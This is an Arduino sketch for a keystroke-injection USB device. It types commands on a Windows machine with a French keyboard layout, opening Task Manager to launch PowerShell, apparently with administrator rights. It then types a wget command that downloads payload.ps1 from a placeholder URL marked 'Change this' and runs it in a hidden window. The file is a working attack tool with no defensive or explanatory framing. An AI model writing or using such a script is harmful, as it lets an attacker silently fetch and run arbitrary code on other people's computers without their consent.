#include <Keyboard.h>
#include <stdlib.h>

void setup(){
  String text = "wget https://localhost/payload.ps1 -O payload.ps1"; // Change this
  delay(800);
  runCmd(fr2en("taskmgr")+"\n");
  delay(1500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("f");   
  Keyboard.print("n");
  delay(300);
  String french = "powershell.exe";
  String uk = fr2en(french);
  Keyboard.print(uk);
  delay(300);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  Keyboard.press(32);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  String text_en = fr2en(text);
  Keyboard.print(text_en + "\n");
  delay(1000);
  String var_text = "PowerShell.exe -windowstyle hidden {powershell -noexit payload.ps1}";
  String text_fr = fr2en(var_text);
  Keyboard.print(text_fr + "\n");
  Keyboard.releaseAll();
}

String fr2en(String text){
  int i = 0;
  String _en = " =qwertyuiopasdfghjkl;zxcvbnQWERTYUIOPASDFGHJKL:ZXCVBNm,./M<>?1234567890!@#$%^&*()",
         _fr = " =azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN,;:!?./ & \"'(- _  1234567890",
         str = "";
  while (text[i] != 0){
    str = str + (String)_en[_fr.indexOf((String)text[i++])];
  }
  return str;
}

void runCmd(String cmd){
  int i = 0;
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  while (cmd[i] != 0){
    Keyboard.write(cmd[i++]);
    delay(50);
  }
}


void loop(){
}
